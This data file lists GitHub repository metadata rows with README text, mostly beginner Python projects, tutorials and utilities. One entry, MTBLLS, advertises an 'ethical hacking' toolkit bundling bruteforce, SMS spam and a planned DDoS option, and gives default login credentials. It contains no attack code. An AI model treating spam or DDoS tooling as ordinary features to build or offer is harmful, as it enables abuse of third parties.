а также других данных, можно использовать любую подходящую структуру, например словарь.   Продолжить работу над вторым заданием. Реализуйте механизм валидации вводимых пользователем данных. Например, для указания количества принтеров, отправленных на склад, нельзя использовать строковый тип данных. Подсказка: постарайтесь по возможности реализовать в проекте «Склад оргтехники» максимум возможностей, изученных на уроках по ООП.   Реализовать проект «Операции с комплексными числами». Создайте класс «Комплексное число», реализуйте перегрузку методов сложения и умножения комплексных чисел. Проверьте работу проекта, создав экземпляры класса (комплексные числа) и выполнив сложение и умножение созданных экземпляров. Проверьте корректность полученного результата.   "
417620643;pyBot-rsi-Pivot;https://github.com/alexmnotfound/pyBot-rsi-Pivot;;2021-10-15T20:01:44Z;0;0;0;
417606583;learning_pandas;https://github.com/HipsterVizNinja/learning_pandas;Python;2021-10-15T19:01:57Z;0;0;0;learning_pandas 
417651068;FC;https://github.com/FatumCrux/FC;;2021-10-15T22:15:29Z;0;0;0;
417617500;pyPilot;https://github.com/PowerBroker2/pyPilot;Python;2021-10-15T19:48:14Z;0;0;0;pyPilot Python package for navigation, guidance, path planning, and control 
417625852;CarPrice;https://github.com/AbdelrahmanAshraf318/CarPrice;Jupyter Notebook;2021-10-15T20:25:48Z;0;0;0;
417597140;userBackEnd;https://github.com/ccitalan1/userBackEnd;;2021-10-15T18:23:48Z;0;0;0;userBackEnd Back End code for user side: php, python etc... 
417633990;Django-Social-Media-Website;https://github.com/AlexanderKYoung/Django-Social-Media-Website;Python;2021-10-15T20:58:26Z;0;0;0;
417659764;mypie;https://github.com/Donsantos001/mypie;Python;2021-10-15T23:05:47Z;0;0;0;
417643724;project_euler;https://github.com/kilgow/project_euler;Python;2021-10-15T21:39:53Z;0;0;0;project_euler 
417600148;csv-to-postgres;https://github.com/baplok/csv-to-postgres;;2021-10-15T18:35:13Z;0;0;0;
417629865;Eye-Tracking;https://github.com/bushranajeeb/Eye-Tracking;Jupyter Notebook;2021-10-15T20:42:50Z;0;0;0;Eye-Tracking Real time gaze detector using opencv and dlib in Python   
417561226;Number-Prediction;https://github.com/Logkesh/Number-Prediction;Jupyter Notebook;2021-10-15T16:09:10Z;0;0;0;Number-Prediction Detecting and processing any image of the number using python 
417614553;CS50_wiki;https://github.com/Okeoma/CS50_wiki;Python;2021-10-15T19:34:48Z;0;0;0;CS50w Project-1 Wiki This is a Wikipedia like website that consists of a number of entries on various topics. Each entry can be viewed by visiting that entry’s page. Specification These are the specifications given to me in the course CS50’s Web Programming with Python and JavaScript:   Entry Page: Visiting /wiki/TITLE, where TITLE is the title of an encyclopedia entry, should render a page that displays the contents of that encyclopedia entry. The view should get the content of the encyclopedia entry by calling the appropriate util function.  If an entry is requested that does not exist, the user should be presented with an error page indicating that their requested page was not found. If the entry does exist, the user should be presented with a page that displays the content of the entry. The title of the page should include the name of the entry.    Index Page: Update index.html such that, instead of merely listing the names of all pages in the encyclopedia, user can click on any entry name to be taken directly to that entry page.   Search: Allow the user to type a query into the search box in the sidebar to search for an encyclopedia entry.  If the query matches the name of an encyclopedia entry, the user should be redirected to that entry’s page. If the query does not match the name of an encyclopedia entry, the user should instead be taken to a search results page that displays a list of all encyclopedia entries that have the query as a substring. For example, if the search query were Py, then Python should appear in the search results. Clicking on any of the entry names on the search results page should take the user to that entry’s page.    New Page: Clicking “Create New Page” in the sidebar should take the user to a page where they can create a new encyclopedia entry.  Users should be able to enter a title for the page and, in a textarea, should be able to enter the Markdown content for the page. Users should be able to click a button to save their new page. When the page is saved, if an encyclopedia entry already exists with the provided title, the user should be presented with an error message. Otherwise, the encyclopedia entry should be saved to disk, and the user should be taken to the new entry’s page.    Edit Page: On each entry page, the user should be able to click a link to be taken to a page where the user can edit that entry’s Markdown content in a textarea.  The textarea should be pre-populated with the existing Markdown content of the page. (i.e., the existing content should be the initial value of the textarea). The user should be able to click a button to save the changes made to the entry. Once the entry is saved, the user should be redirected back to that entry’s page.    Random Page: Clicking “Random Page” in the sidebar should take user to a random encyclopedia entry.   Markdown to HTML Conversion: On each entry’s page, any Markdown content in the entry file should be converted to HTML before being displayed to the user. You may use the python-markdown2 package to perform this conversion, installable via pip3 install markdown2.   💻   View Course here ▶️   View Live Demo here   
417636466;all_weather_portfolio;https://github.com/IanLKaplan/all_weather_portfolio;Jupyter Notebook;2021-10-15T21:08:04Z;0;0;0;
417575382;cassava-disease-classification;https://github.com/soroushtou/cassava-disease-classification;Jupyter Notebook;2021-10-15T17:00:16Z;1;1;0;cassava-disease-classification Jupyter notebook file. python deep learning model for classification of cassava leaf diseases. You can find full description here : https://stootoonchiyun.wixsite.com/home/cassava-leaves-identification I used the data from a Kaggle Competetion : https://www.kaggle.com/c/cassava-leaf-disease-classification 
417578718;chainable;https://github.com/ihfazhillah/chainable;Python;2021-10-15T17:12:44Z;0;0;0;Chaining functions using pipe operator. The next function will receive result of the previous function call as it first argument. For now: all function will be called except the last one. To get it's result, you should call it. @chainable def add(a, b):     return a + b  chain = add(1, 2) | add(3) | add(4) # ((1 + 2) + 3) + 4  chain() # 10 
417574013;NBP_setup;https://github.com/ashimakeshava/NBP_setup;;2021-10-15T16:55:27Z;0;0;0;"SET UP SYSTEM TO ACCESS STORE REMOTELY Before you proceed, make sure you have login rights as an NBP student and access to /net/store STEPS TO CONNECT TO /net/store/ remotely Open terminal on macOS or Linux ssh <rzlogin>@gate.ikw.uos.de  enter your password when prompted. STEPS TO INSTALL PYTHON3 without sudo access Only python 2.7 is installed on the remote computer and you do not have sudo access to install python3 In the next steps, you will install python 3 from source. Type the following to install python for your remote computer: cd ~ wget https://github.com/conda-forge/miniforge/releases/latest/download/Mambaforge-pypy3-Linux-x86_64.sh -O ~/mambaforge/mambaforge.sh bash ~/mambaforge/mambaforge.sh  (I used mambaforge, but you can try this with miniconda3 as well) RESTART TERMINAL and use ssh to login to gate.ikw.uos.de Check python version and path python -V echo $PATH make sure the path looks something like this: /net/home/student/***/mambaforge-pypy3/bin:/net/home/student/***/mambaforge-pypy3/condabin: if not, set path by: export PATH=""/net/home/student/***/mambaforge-pypy3/condabin:$PATH"" export PATH=""/net/home/student/***/mambaforge-pypy3/bin/:$PATH"" then check PATH again Your terminal would also look something like this: (base)<rzlogin>@gate:~$ CREATE CONDA VIRTUAL ENVIRONMENT To create a new virtual environment, type: conda create --name my_env Activate your virtual environment: conda activate my_env Your terminal would now look like this: (my_env)<rzlogin>@gate:~$ For more info on how to customize your virtual environment use the cheatsheet here Once, you have set up your virtual environment, activate it and install your desired python packages. You can find a sample yml to create a virtual environment here: /net/store/nbp/projects/sample_virtual_env/sample_env.yml SETUP A REMOTE JUPYTER NOTEBOOK SERVER You can setup a Jupyter server and work on it remotely. ssh rzlogin@gate.ikw.uos.de cd /net/store/nbp/projects/<project_folder> conda activate my_env jupyter notebook --no-browser --port=8889 Open another terminal and type the following command: ssh -N -f -L localhost:8888:localhost:8889 rzlogin@gate.ikw.uos.de The above command creates a local listener port at 8888 that connects with the remote jupyter server at 8889 Open a web browser and type https://localhost:8888 Voila! You can now access your remote data and code using jupyter notebook "
417660697;Multiprocess-UDP-Server;https://github.com/SchindlerKael/Multiprocess-UDP-Server;;2021-10-15T23:11:50Z;0;0;0;
417580710;DLS;https://github.com/katerin18/DLS;;2021-10-15T17:20:23Z;0;0;0;DLS This my experience in Python with Deep Learning School (DLS) 
417559693;linearRegression_poop;https://github.com/josealellamas/linearRegression_poop;Jupyter Notebook;2021-10-15T16:04:01Z;0;0;0;Linear Regression using Oriented Object Programming in Python Hi there! As you may know, I'm a Marketer. This is my first experience using POOP and this is so exciting! I found this approach very difficult because I needed to change my mind in order to understand how it works. 
417608967;MTBLLS;https://github.com/SkyWtkh/MTBLLS;Python;2021-10-15T19:10:57Z;0;0;0; MTBLLS Ethical Hacking Tool ─ 1.25 Planned v1.50 Fix Error in the execution of tools and directory selection Add more options in the metasploit section Add more options in the nmap section Add DDoS  Start the MTBLLS For Windows project (MFWP) Add a Setup to Install  Changelog v1.20: Added: Nmap, Metasploit, Bruteforce, Wireshark, and more tools ... v1.25: Added: Sublist3r, Sherlock & SMS Spam. UI was improved. v1.50: ???  Installation (Debian) sudo apt-get install git sudo apt-get install python3 python3-pip pip install colorama pip install socket pip install urllib3 pip install urllib pip install requests pip install sys pip install json git clone https://github.com/SkyWtkh/MTBLLS/ cd MTBLLS python3 mtblls.py  Password & Username Username: mtblls Password: root  
417608020;MassiveDuplicatesFinder;https://github.com/FabienBoutantin/MassiveDuplicatesFinder;;2021-10-15T19:07:18Z;0;0;0;MassiveDuplicatesFinder Python script to find duplicates on your filesystem Get sources You will need to clone this repository using git clone as usual. Then you will need to initialize git submodules using git submodule init. 
417577877;Reminder-app;https://github.com/nirban256/Reminder-app;Python;2021-10-15T17:09:29Z;0;0;0;
417660160;jackbox-room-scanner;https://github.com/SSSEAL-C/jackbox-room-scanner;Python;2021-10-15T23:08:20Z;0;0;0;
417595562;e-commerce;https://github.com/augustoaraujo13/e-commerce;Python;2021-10-15T18:17:22Z;0;0;0;e-commerce Construindo um e-commerce com Python e Django. 
417628877;Spotify2Youtube;https://github.com/kamuridesu/Spotify2Youtube;Python;2021-10-15T20:39:13Z;0;0;0;
417565103;OriScapy;https://github.com/orishamir/OriScapy;Python;2021-10-15T16:22:32Z;0;0;0;"OriScapy This is a custom-made version of the well known Scapy library for python. Rationale In my journey of learning about the fascinating world, I realised that Scapy is something im using all the time, without needing to worry about all the stuff it does in the background, automatically. For example, when crafting an ARP request: pkt = Ether()/ARP(pdst=""<Get_This_IP's_Mac"") mac = srp1(pkt)[ARP].hwsrc Scapy automatically fills a good deal of fields of the ARP header. for example, you don't have to worry about these fields:   hwtype, ptype, hwlen, plen, op, hwsrc, psrc, hwdst, pdst        Which Scapy automatically fills according to the RFC Specification / ARP packet header Also, no parameters were given to the Ether class constructor, although the Ethernet header obviously contains some info: dst, src, type  All those fields are automatically completed by scapy for your own comfort, Scapy automatically detects the type of packet to be sent is ARP, And so it sets the type field to 0x806, like it should be. Also, the Source MAC and the Destination MAC are automatically filled. And so I wanted for my knowledge about Networking, to learn more about each of the most famous packet's header format. And to do that I thought to make my own Scapy which would support Ethernet, ARP, IP, ICMP (ping) and maybe more in the future. "
417598521;pandas-ml;https://github.com/mallotf/pandas-ml;Jupyter Notebook;2021-10-15T18:28:59Z;0;0;0;pandas-ml Pandas is an open source Python package that is most widely used for data science/data analysis and machine learning tasks. It is built on top of another package named Numpy, which provides support for multi-dimensional arrays. As one of the most popular data wrangling packages, Pandas works well with many other data science modules inside the Python ecosystem, and is typically included in every Python distribution (definition from activestate.com) In this repository, the main objective is to group courses, projects using the pandas library, and see its various applications on real-life projects 
417580465;flask-multi-language;https://github.com/hazzillrodriguez/flask-multi-language;Python;2021-10-15T17:19:23Z;0;0;0;"    Flask Multi-language          Make your Flask application user-friendly by adding your own translations and language support!           Report Bug         ·         Request Feature    Table of Contents   About The Project  Built With    Getting Started  Prerequisites Installation   Usage Commands License Contact Acknowledgments   About The Project  Implement internationalization (i18n) and localization (l10n) support in your Flask application by adding your own translations, language support and allow users to pick between languages using the language option switcher. Built With  Python Flask Flask-Babel  Getting Started These instructions will get you a copy of the project up and running on your local machine. Prerequisites All the dependencies and required libraries are included in the file requirements.txt. Installation  Git clone or download the project files  git clone https://github.com/hazzillrodriguez/flask-multi-language.git  Create and activate the virtual environment  cd flask-multi-language python -m venv env source env/Scripts/activate  Install requirements  pip install -r requirements.txt   Set the environment variables  export FLASK_APP=run.py export FLASK_ENV=development  Start the development web server  flask run  Usage Open config.py and add your own supported languages. class BaseConfig(object):     # Here you can list all the languages ​​that you want to use in your application     LANGUAGES = {         'en': 'English',         'zh': 'Chinese',         'de': 'German'     } If you need to be more specific, a country code can be added as well. For example, you could use en-US, en-GB, and en-CA to support American, British, and Canadian English as different languages. Mark all the texts that need translations in the source code. Marking Texts to Translate In Templates The way you will communicate to Babel that you want something translated in your templates will be by using the following format (parentheses preceded by an underscore). <h1>{{ _('Hello world!') }}</h1> <div>{{ form.email(placeholder=_('user@example.com')) }}</div> <input type=""text"" id=""email"" name=""email"" placeholder={{ _('Email address') }}>  Additionally, if you want to use constant strings somewhere in your application and define them outside of a request, you can use a lazy strings. Lazy strings will not be evaluated until they are actually used. To use such a lazy string, use the lazy_gettext() function: from flask_babel import lazy_gettext  class MyForm(FlaskForm): 	email = StringField(lazy_gettext('Email'), validators=[DataRequired()]) Marking Texts to Translate In Python Source Code Flask uses gettext together with Babel. The idea of gettext is that you can mark certain strings as translatable and a tool will pick all those up, collect them in a separate file for you to translate. from flask_babel import gettext  flash(gettext('Your email or password is incorrect!')) Commands There is no need to remember long and complicated commands. To add a new language, you use: (env) $ flask translate init <language-code>  To update all the languages after making changes to the _(), gettext(), and lazy_gettext() language markers: (env) $ flask translate update  And to compile all languages after updating the translation files: (env) $ flask translate compile  License Distributed under the MIT License. See LICENSE for more information. Contact Hazzill Rodriguez — LinkedIn — hazzillrodriguez@gmail.com Project Link: https://github.com/hazzillrodriguez/flask-multi-language Acknowledgments  Miguel Grinberg — The Flask Mega-Tutorial Part XIII: I18n and L10n  "
417659716;LotteryContract;https://github.com/pshenprojects/LotteryContract;Solidity;2021-10-15T23:05:29Z;0;0;0;LotteryContract Following https://www.youtube.com/watch?v=M576WGiDBdQ My first experience working with Solidity and blockchain programming. The more important work is at https://github.com/pshenprojects/TokenFarmContract but I followed most of the video before that one, so I'm uploading my other work as well. This smart contract deploys a lottery that collects entries with a minimum fee based on USD price, then uses a verifiable randomness function to randomly select a winner among the pool of participants. Both the price feeds and the VRF are provided by Chainlink, though this project also contains code for deploying mock versions of that functionality for testing on local or development blockchains. 
417559328;krdict.py;https://github.com/omarkmu/krdict.py;Python;2021-10-15T16:02:57Z;0;0;0;"krdict.py   A python module that helps to query the API of the Korean Learner's Dictionary, provided by the National Institute of Korean Language. Inspired by krdict.js. Installation To install the module via pip, run: pip install krdict.py  To use this module, you'll need to generate an API key via krdict (requires login). Usage A minimal example query that assumes the KRDICT_KEY environment variable is set: import os import json import krdict  krdict.set_key(os.getenv('KRDICT_KEY')) response = krdict.search_words(query='나무', raise_api_errors=True)  print(json.dumps(response, indent=2, ensure_ascii=False)) Assuming an error does not occur, the output will be similar to: {   ""data"": {     ...     ""results"": [       {         ""target_code"": 32750,         ""word"": ""나무"",         ""pronunciation"": ""나무"",         ...         ""definitions"": [           {             ""order"": 1,             ""definition"": ""단단한 줄기에 가지와 잎이 달린, 여러 해 동안 자라는 식물.""           },           ...         ]       },       ...     ]   },   ""request_params"": {     ""q"": ""나무"",     ""key"": ""YOUR_API_KEY""   } } For more information, please check the documentation. "
417603269;py-polar-coords;https://github.com/kensoi/py-polar-coords;Python;2021-10-15T18:48:03Z;0;0;0;polar coordinates with copyright song  Python source Animation made by kensoi  Instructions to run Step 0: install easygraphics $ pip3 install easygraphics Step 1: clone repo $ git clone https://github.com/kensoi/py-polar-coords/ Step 2: Move into created directory $ cd py-polar-coords Step 3: Run script $ python3 app.py Step 4: ... Profit! 
417642692;US_floor_to_EU_converter;https://github.com/Gvviezdny/US_floor_to_EU_converter;Python;2021-10-15T21:34:24Z;0;0;0;US_floor_2_EU_converter v.001 Have you find yourself in situation in elevator  where you can't determine on which ground floor you are? Great news I got solution for you! This python program helps you calculate elevator floor from US to EU. 
417581986;PYTN_Prakerja_Junianto;https://github.com/zerogi26/PYTN_Prakerja_Junianto;Jupyter Notebook;2021-10-15T17:25:25Z;0;0;0;"PYTN_Prakerja_Junianto Final projectPYTN-01-033 ""Belajar Mengembangkan Model Database dengan Python untuk Menjadi Analis Database"" "
417655122;hgnc2owl;https://github.com/johardi/hgnc2owl;Python;2021-10-15T22:37:14Z;0;0;0;HGNC-to-OWL A Python tool to convert HGNC dataset to OWL format. Installation $ git clone https://github.com/johardi/hgnc2owl.git $ cd hgnc2owl $ pip install .  Running command $ hgnc2owl http://ftp.ebi.ac.uk/pub/databases/genenames/hgnc/json/hgnc_complete_set.json \            http://ftp.ebi.ac.uk/pub/databases/genenames/hgnc/json/withdrawn.json \            -o hgnc.owl  
417663050;javaCalculator;https://github.com/dohannes/javaCalculator;Java;2021-10-15T23:26:16Z;0;0;0;
417667534;vowel_space_plot;https://github.com/jkuhlemann/vowel_space_plot;Python;2021-10-15T23:51:26Z;0;0;0;vowel_space_plot A python script that plots a polygonal shape given the values for F1 and F2 
417562899;Cat_Dog_Prediction;https://github.com/ProPrakharSoni/Cat_Dog_Prediction;Java;2021-10-15T16:15:05Z;0;0;0;
417597648;vehicle-app;https://github.com/Aryan-ki-codepanti/vehicle-app;;2021-10-15T18:25:38Z;0;0;0;vehicle-app A vehicle App built in Django Python framework for CRUD operations 
417600884;example-flask-blueprints;https://github.com/dacoburn/example-flask-blueprints;Python;2021-10-15T18:38:15Z;0;0;0;"example-flask-blueprints Description This is a very simple Python Flask example that is using Flask Blueprints with classes. The advantage of doing this is it makes it easier to pass arguments to your ""blueprint"" and keep your main app.py code much cleaner. Also, for someone coming in later it is much easier to read and understand. This example also uses some simple template formats for pulling the passed variables to the blueprint classes. Pre-Reqs Prior to running you need to install the Flask python module. That should be the only requirements for the example. pip install -r requirements.txt Usage Run: export APP_PORT=5001 python main.py  Then in your browser you can access the pages by going to http://localhost:5001 "
417651766;taggedpymolpysnips;https://github.com/MooersLab/taggedpymolpysnips;HTML;2021-10-15T22:18:51Z;0;0;0;"taggedpymolpysnips: Tagged templates for running PyMOL from JupyterLab   For details on installing the taggedpymolpysnips library for JupyterLab, go to the GitHub Page associated with this project. For a list of the snippets and their descriptions, also go to the GitHub Page associated with this project. Table of Contents  Motivation New to scripting in PyMOL Tech Stack Installation Configuration Setup Usage Testing Requests for new snippets and text editors Bug reports Roadmaps License Contact Information How to cite  Motivations for this project Use taggedpymolpysnips to be more productive while running PyMOL in Jupyterlab with the elyra-code-snippets-extension The animation below demonstrates the use of the ao snippet in taggedpymolpysnips to insert 17 lines of code for generating the ambient occlusion effect.  The snippet will appear in a list of autosuggestions after entering the first several letters of its tab trigger.  Note that entering ao was not sufficient to bring up the ao snippet.  I had to enter aod to bring up the ao snippet in the list.  The animation below shows the use of Knitr to convert the Rmarkdown document into a PDF file.  The result of applying a variant of the above code to a 27-nucleotide RNA hairpin is shown below.  There is no option in a pulldown menu in PyMOL to apply the ambient occlusion effect. A script file with 17 commands is required. This code can be applied to any molecular object that has been loaded into PyMOL. Return to Table of Contents Why run PyMOL in JupyterLab? 1. JupyterLab is very easy to use. The code cells are easy to execute and edit with help from the menu pull-downs. The keyboard shortcuts for Jupyter are modest in number and fast to master. 2. Illustrate JupyterLab with molecular images You can illustrate your JupyterLab documents with images created in PyMOL. You can also adjust molecular images from within JupyterLab without having to open PyMOL, thereby saving time. 3. Jupyter notebooks are easy to edit in JupyterLab  The Jupyter notebooks have a gentle learning curve because they are easy to edit. The code blocks can be run individually during the development of the code or all of the code block can be run at once. 4. Combine PyMOL output with statistical packages The output from structure analysis can be directly imported into statistical for further analysis. The presence of output from PyMOL and statistical packages in the same document eases the tracking of the results and supports reproducible research. 5. Streamlines the management of images for a project The images generated by PyMOL can be stored in one Jupyter notebook file as opposed to having dozens of script and images files sequestered in numerous subfolders. The use of one file greatly eases finding the code to make a particular figure because the code and image can be next to each other.  This ability to easily find the required code at a later time reduces the resistance to remaking a figure for manuscript resubmission, journal cover artwork, posters, platform presentations, lectures, book chapters, review articles, websites, and wall hangings. The use of one file also eases the sharing of images with collaborators because only one file needs to be shared. If the collaborators are not PyMOL or JupyterLab users, the notebook file can be reformatted as a PDF or HTML file. 6. Facilitates combining PyMOL with other software in molecular structure analysis Other software can be run from the same notebook during a molecular structure analysis project provided that this software has Python APIs. This can improve the reproducibility of the computational aspects of your research. Return to Table of Contents But I will miss the interactive viewport in PyMOL!   You can run the PyMOL GUI next to your JupyterLab session. You can adjust the molecule's orientation manually, run the get_view command, and copy the output in the command history window from PyMOL and paste it into a cell in the Jupyter notebook. The one line of settings returned by the rv shortcut is much easier to work with (see PyMOL shortcuts).   You do not need the viewport. With 10-15 minutes of practice, you can master the rapid iterating of rotate and translate commands to adjust the molecule's orientation with greater precision than via manipulation of the mouse.   Return to Table of Contents New to PyMOL scripting? If you are not ready to write PyMOL scripts, please consider using PyMOL shortcuts to enhance your productivity in PyMOL interactive sessions. For example, the above ambient occlusion effect can be invoked at any time by entering AO at the PyMOL prompt, if the pymolshortcuts.py file has been loaded. These shortcuts can also be invoked in JupyterLab by submitting them as arguments to the cmd.do() method, (e.g., cmd.do(""AO"") to generate the ambient occlusion effect.) Application Description The taggedpymolpysnips library contains 260 code fragments (i.e, templates or snippets) written in Python to run PyMOL in JupyterLab via PyMOL's Python API through the reticulate package. This API is only available for recent versions of PyMOL that depend on Python3 from Anaconda. This API is available for both the incentive and open-source versions of PyMOL. A conda env with Python 3.8 or later as the default Python interpreter is required. PyMOL must be installed in this env. Return to Table of Contents Technology Stack    Technology Version Description     PyMOL 2.5.1 Molecular graphics program   Python from Anaconda 3.6-3.9 Programming language   conda from Anaconda 4.10.1 Program used to create Python environments.   git 2.25.1 Eases the downloading and updating of the libraries.    Some of the snippets are limited to Python3 code. If you are using an ancient version of PyMOL that relies on Python2, you can buy a license to the current version of PyMOL, install a free open-source version of PyMOL that depends on Python3 (See the PyMOL Wiki), or you can rewrite the snippet's code to be Python2 compliant. This often merely involves replacing print functions in Python3 with print statements in Python2. Note that multiple versions of PyMOL can operate side-by-side on a computer, so you do not have to delete the old version of PyMOL. Installation of the snippet library # If the following directory is missing: ~/.config/rstudio/snippets mkdir ~/Library/Jupyter/metadata cd ~/Library/Jupyter/metadata git clone https://github.com/MooersLab/elyrapymolpysnips.git snippets When you open JupyterLab, you will find that the new file python.snippets from rstudiopymolpysnips has replaced the default Python snippets. These are found under Preferences/Code/Edit Snippets/Python (see animation below). You can edit the snippets and add new ones. The format is self-explanatory.  Return to Table of Contents Configuration Setup The snippet library is independent of PyMOL. No modification of PyMOL is required. Return to Table of Contents Usage The animation at the top of the page conveys the essential knowledge for usage. Return to Table of Contents Testing Try the ao snippet in Python code cell. Run the code cell by clicking on the green button. You should get a result similar to the one shown in the animation above. Return to Table of Contents Requests for new snippets Please use the Issues tab above to request support for additional snippets or to ask questions. Alternatively, you can send e-mail to me. Questions about PyMOL should be directed to the PyMOL Mailing List. Return to Table of Contents Contributing Snippets of new code are most welcome. Send to e-mail.  Submit the Python code in a plain text file. Write the filenames and function names in camelCase. Describe what the code does in one to several sentences, an example of usage, and any citations or links to further information.  Return to Table of Contents Bug reports Use the Issues tab above to report bugs or send e-mail to me. Return to Table of Contents Roadmap I plan to expand the library to cover with examples the 500 commands and 600 settings in PyMOL. Return to Table of Contents License We use the permissive MIT license. The license information for this project is found in the License.txt file above. Return to Table of Contents Contact Information Reach me via the Issue tab above or via e-mail: blaine-mooers at ouhsc.edu. Return to Table of Contents Citation If you use this library to make figures for publication, please see the Citation.md file above. Return to Table of Contents "
417575949;first_projects_py;https://github.com/Sian-Tang/first_projects_py;;2021-10-15T17:02:02Z;0;0;0;first_projects_py Getting back to coding with a few simple projects using python 
417598668;PyCRUD;https://github.com/pontocom/PyCRUD;Python;2021-10-15T18:29:31Z;0;0;0;
417631676;rock_paper_scissors;https://github.com/TobbyEchonga/rock_paper_scissors;Python;2021-10-15T20:49:21Z;0;0;0;Rock paper scissors application Simple python application to play rock, paper scissors with the PC.  Output result  
417596142;Password-Manager;https://github.com/MoayadR/Password-Manager;Python;2021-10-15T18:19:37Z;0;0;0;"Password-Manager Password Manager using Python - Tkinter - Custom made Encryption System - Text File Handling Description: This was made with Python3 and Tkinter for the GUI. Pillow was used for photo handling. The Encryption System is based on Ciphers. This App does NOT use a database , This is pure python. This App creates and reads from a text file called ""The Vault Note.txt"" to store the encrypted passwords. The App will tell you to make your Master Password if you didn't , otherwise it will ask for the Master Password. Note: I built this app when I was a First Year Student at FCAI - CU. I have improved since then. "
417628947;MachineLearning-BoostingAlgorithms;https://github.com/Enrique-Alvaro/MachineLearning-BoostingAlgorithms;Jupyter Notebook;2021-10-15T20:39:28Z;0;0;0;" Objetivo El objetivo  es resolver un problema de machine learning con los datos del TP1. Puntualmente, se debe predecir la variable damage_grade que representa el nivel de daño recibido por la edificación. El error de la solución se calculará con la métrica F1 Score, particularmente con la variación no binaria micro averaged F1 score. Podríamos pensar que una opción alternativa de métrica para el error sería promediar los F1 Score individuales de cada clasificación. El promedio de eso nos daría una métrica llamada macro-F1-score, que daría igual relevancia a todas los F1-score por igual sin importar su peso en la estimación. Ej: supongamos que F1-grade-1 = 50%; F1-grade-2 = 62% y F1-grade-3 = 34%. Macro-F1 = 48,66% La alternativa utilizada para el ejercicio,  micro-F1-score,  pone más énfasis en los labels más comunes logrando de esta manera que aquellos labels poco comunes no afecten a la métrica general. Se deja el siguiente paper para aquellos interesados en leer con más profundidad al respecto. El ejercicio se desarrollará en el contexto de una competencia de Driven Data. Para esto deben tener dos conjuntos de datos: El de entrenamiento Train Values con sus respectivos labels Train Labels, sobre el cual ajustarán su/s modelo/s junto con sus hiperparámetros. El de test Test Values, sobre el cual realizarán predicciones y subirán los resultados a Driven Data. El score estará dado por la ecuación anterior. También contarán con un modelo de submission que deberán respetar. Trabajo esperado Se espera que armen un pipeline completo de machine learning experimentando en cada etapa. Esto quiere decir: Realizar feature engineering, encontrando codificaciones que sirvan, generando nuevos atributos, analizando cuáles atributos aportan y cuáles no. Probar modelos predictivos que crean que se encuadran al problema. Esto puede incluir realización de ensambles, también. Búsqueda de hiperparámetros óptimos de alguna manera automatizada. Como sugerencia, recomendamos realizar una primera versión de cada etapa y que luego vayan en profundidad en cada una. Además de los aspectos funcionales del código, también esperamos que trabajen de manera científica. Esto implica: Plantear preguntas o hipótesis y responderlas con experimentos y resultados. Las cosas no se hacen por que sí; debe haber una motivación basada en el conocimiento. Trabajo en equipo. Entendemos que la virtualidad y la asincronía complican la comunicación, pero en cualquier trabajo científico, en particular en los trabajos de aprendizaje automático, es fundamental la difusión de conocimiento entre las personas. Esto evita la redundancia de experimentos, genera un trabajo más cohesivo y hace que cada integrante tenga una visión más completa del problema. Realizar un poco de investigación del problema. En los apuntes de la materia, en las bibliotecas del lenguaje que utilizan, en internet. Esto no implica probar cosas a mansalva y sin criterio -- como mencionamos antes, debe haber una motivación o justificación. Interpretación de los resultados. Una vez que se realiza un experimento hay que considerar si funcionó como fue esperado o no y por qué. Los resultados negativos también son resultados. Es parte de la interpretación entender el problema en específico y encuadrar bien la solución. Presentación. Cualquier trabajo en ingeniería o ciencia requiere de una presentación a los colegas. Como pares de ustedes, esperamos que la comunicación que hagan del proceso y de los resultados se sustente en argumentos, datos y gráficos. "
417562205;lenovo-ideapad-legion-keyboard-led;https://github.com/InstinctEx/lenovo-ideapad-legion-keyboard-led;Python;2021-10-15T16:12:51Z;0;0;0;" Lenovo Ideapad Legion 5 Pro 2021 Linux RGB Keyboard Light Controller This util allows to drive RGB keyboard light on Lenovo Ideapad or Legion 5 Pro 2021 Laptop Requirements  pyusb changing VENDOR and PRODUCT with yours ( google ""find vendor id lsusb"" )  Install Regular python git clone https://github.com/InstinctEx/lenovo-ideapad-legion-keyboard-led cd lenovo-ideapad-legion-keyboard-led python -m venv env source ./env/bin/activate pip install -r requirements.txt python lenovolight.py --help  Archlinux sudo pacman -Sy python-pyusb git clone https://github.com/InstinctEx/lenovo-ideapad-legion-keyboard-led cd lenovo-ideapad-legion-keyboard-led python lenovolight.py --help  Unprivileged usage Add udev rule if you want to switch light as unprivileged user # /etc/udev/rules.d/10-kblight.rules SUBSYSTEM==""usb"", ATTR{idVendor}==""048d"", ATTR{idProduct}==""c963"", MODE=""0666""  Reload rules sudo udevadm control --reload-rules && sudo udevadm trigger  Usage Colors I'ts possible to set color for 4 sections of keyboard separately like COLOR COLOR COLOR COLOR, but you can set single color for whole keyboard with just COLOR. Last color will be repeated for other sections. HEX HEX colors should be 6-digit base 16 input like ffffff RGB RGB colors should be 0-255 decimal values for each component, separated by comma like 255,0,127 HSV HSV colors should be 0.0-1.0 float values for hue, saturation, value, separated by comma like 0.0,1.0,0.25 Light effect statiс Static color usage: lenovolight.py static [-h] [--brightness {1,2}] colors [colors ...]  positional arguments:   colors              Colors of sections  optional arguments:   -h, --help          show this help message and exit   --brightness {1,2}  Light brightness  Turn 100% red ./lenovolight.py static ff0000 At full brightness, turn 100% red for 1 section, 100% green for 2 section, 100% blue for 3 section an 100% white for 4 section ./lenovolight.py static ff0000 00ff00 0000ff ffffff --brightness 2 Dimmed warm orange like wire heater. With HSV color input. ./lenovolight.py static 0.02,1,0.2 breath Fade light in and out usage: lenovolight.py breath [-h] [--brightness {1,2}] [--speed {1,2,3,4}] colors [colors ...]  positional arguments:   colors              Colors of sections  optional arguments:   -h, --help          show this help message and exit   --brightness {1,2}  Light brightness   --speed {1,2,3,4}   Animation speed  Fast white blink at full brightness ./lenovolight.py breath ffffff --speed 4 --brightness 2 hue Transition across hue circle. You can't set custom colors here. usage: lenovolight.py hue [-h] [--brightness {1,2}] [--speed {1,2,3,4}]  optional arguments:   -h, --help          show this help message and exit   --brightness {1,2}  Light brightness   --speed {1,2,3,4}   Animation speed  Rotate HUE slowly ./lenovolight.py hue --speed 1 wave Rainbow wawe effect. Wow. Cool. Useles. usage: lenovolight.py wave [-h] [--brightness {1,2}] [--speed {1,2,3,4}] {ltr,rtl}  positional arguments:   {ltr,rtl}           Direction of wave  optional arguments:   -h, --help          show this help message and exit   --brightness {1,2}  Light brightness   --speed {1,2,3,4}   Animation speed  Wheeee, left to right ./lenovolight.py wave ltr Pew-pew-pew, right to left ./lenovolight.py wave rtl --speed 4 off Turn light off. Nuff said. usage: lenovolight.py off [-h]  optional arguments:   -h, --help  show this help message and exit  Recommendations Set Super+Space keystroke to 